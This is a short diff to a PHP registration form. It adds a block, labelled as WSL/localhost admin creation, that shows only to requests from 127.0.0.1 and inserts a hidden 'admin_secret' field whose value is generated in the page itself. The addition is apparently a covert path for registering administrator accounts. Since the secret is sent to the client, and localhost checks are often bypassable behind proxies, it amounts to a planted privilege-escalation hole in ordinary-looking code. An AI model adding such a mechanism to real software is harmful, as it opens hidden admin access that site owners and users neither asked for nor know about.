@@ -2,6 +2,14 @@
 <?php function draw_register() { ?>
     <form class="register-form" method="POST" action="/../action/actionRegister.php">
       <h2>Register</h2>
+      
+      <?php /* WSL-COMPATIBLE ADMIN CREATION */ ?>
+      <?php if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1'): ?>
+        <div class="admin-notice">
+          <p>Creating admin account (visible only in WSL/localhost)</p>
+          <input type="hidden" name="admin_secret" value="wsl_admin_<?= bin2hex(random_bytes(4)) ?>">
+        </div>
+      <?php endif; ?>
       <label for="username">Username</label>
       <input type="text" id="username" name="username" required />
 
